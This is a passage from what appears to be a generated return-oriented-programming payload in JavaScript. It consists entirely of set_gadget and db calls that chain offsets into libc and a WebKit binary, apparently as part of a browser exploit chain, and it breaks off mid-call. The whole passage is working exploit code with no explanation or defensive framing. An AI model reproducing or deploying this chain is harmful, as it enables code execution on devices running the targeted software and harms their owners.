set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+173264,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+173256,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+173280,
ropchain+173584,
libc_base+759626,
libc_base+793877,
ropchain+173320,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+173448,
webkit_base+7438103,
libc_base+793877,
ropchain+173464,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+173576,
webkit_base+7438103,
libc_base+793877,
ropchain+173560,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+219984,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+173744,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+186592,

libc_base+882884,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+173816,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([2, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+174032,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+187920,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+174104,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+50775,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+793877,
ropchain+174224,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+50775,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+793877,
ropchain+174320,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174392,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174464,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174536,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174608,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174680,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174752,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+865136,
libc_base+793877,
ropchain+174824,
webkit_base+7438103,
libc_base+793877
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+759626,
libc_base+793877
]);

db([4294967265, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+174920,
webkit_base+7438103,
libc_base+792472
]);

db([2, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+865136,
libc_base+759626,
libc_base+793877
]);

db([4294967266, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+175008,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([15651, 0]);
set_gadgets([
libc_base+562536,
libc_base+793877,
ropchain+175080,
webkit_base+7438103,
libc_base+759626,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967268, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+175160,
webkit_base+7438103,
libc_base+792472
]);

db([16777343, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+954100,
libc_base+793877,
ropchain+175208,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([16, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+175320,
webkit_base+7438103,
libc_base+793877
]);

db([4294967264, 4294967295]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+175408,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+175512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+175528,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+175680,
webkit_base+7438103,
libc_base+793877,
ropchain+175712,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+175664,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+175696,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+175808,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+175792,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+175912,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+189248,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+176064,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+176080,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+176200,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+176184,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967256, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+176344,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+176360,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+176512,
webkit_base+7438103,
libc_base+793877,
ropchain+176544,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+176496,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+176528,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+176664,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+176648,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967252, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+793877,
ropchain+176728,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+793877,
ropchain+176776,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967252, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+176880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+176896,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+177048,
webkit_base+7438103,
libc_base+793877,
ropchain+177080,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+177032,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+177064,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+177152,
webkit_base+7438103,
libc_base+793877,
ropchain+177168,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+177272,
webkit_base+7438103,
libc_base+793877,
ropchain+177320,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+177288,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+177432,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+177424,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+177448,
ropchain+182712,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967252, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+177568,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+177584,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+177736,
webkit_base+7438103,
libc_base+793877,
ropchain+177768,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+177720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+177752,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+177840,
webkit_base+7438103,
libc_base+793877,
ropchain+177856,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+177952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+177936,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+178032,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967256, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+178136,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+178152,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+178296,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+178264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+178280,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+178376,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+178480,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+178496,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+178648,
webkit_base+7438103,
libc_base+793877,
ropchain+178680,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+178632,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+178664,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+178776,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+178760,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+178880,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+185264,

libc_base+882884,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+178952,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+179096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+179112,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+179264,
webkit_base+7438103,
libc_base+793877,
ropchain+179296,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+179248,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+179280,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+179368,
webkit_base+7438103,
libc_base+793877,
ropchain+179384,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+179480,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+179464,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+179560,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+179712,
webkit_base+7438103,
libc_base+793877,
ropchain+179728,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+179696,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+8824269,
libc_base+269973,
libc_base+793877,
ropchain+179896,
webkit_base+7438103,
libc_base+793877,
ropchain+179912,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+179880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+180016,
webkit_base+7438103,
libc_base+793877,
ropchain+180064,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+180032,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+180176,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+180168,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+180192,
ropchain+180208,
libc_base+811575,
ropchain+182744,

libc_base+793877,
ropchain+180248,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967256, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+180352,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+180368,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+180512,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+180480,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+180496,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+180584,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+180640,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+180720,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+180824,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+180840,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+180992,
webkit_base+7438103,
libc_base+793877,
ropchain+181024,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+180976,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+181008,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+181144,
webkit_base+7438103,
libc_base+793877,
ropchain+181160,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+181128,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+181248,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+181304,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+181376,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967256, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+793877
]);

db([4294967252, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+181520,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+181536,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+181688,
webkit_base+7438103,
libc_base+793877,
ropchain+181720,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+181672,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+181704,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+181816,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+181800,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+181896,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+182000,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+182016,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+182168,
webkit_base+7438103,
libc_base+793877,
ropchain+182200,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+182152,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+182184,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+182320,
webkit_base+7438103,
libc_base+793877,
ropchain+182336,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+182304,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+182488,
webkit_base+7438103,
libc_base+793877,
ropchain+182504,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+182472,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+182624,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+182608,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967252, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+793877,
ropchain+182688,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+811575,
ropchain+182728,

libc_base+811575,
ropchain+182744,

libc_base+811575,
ropchain+176736,

libc_base+793877,
ropchain+182784,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967280, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+182888,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+182904,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+183056,
webkit_base+7438103,
libc_base+793877,
ropchain+183088,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+183040,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+183072,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+183184,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+183168,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+183288,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+183936,

libc_base+882884,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+793877,
ropchain+183360,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+183488,
webkit_base+7438103,
libc_base+793877,
ropchain+183504,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+183616,
webkit_base+7438103,
libc_base+793877,
ropchain+183600,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+183704,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+183688,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+183800,
webkit_base+7438103,
libc_base+793877,
ropchain+183816,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+183928,
webkit_base+7438103,
libc_base+793877,
ropchain+183912,
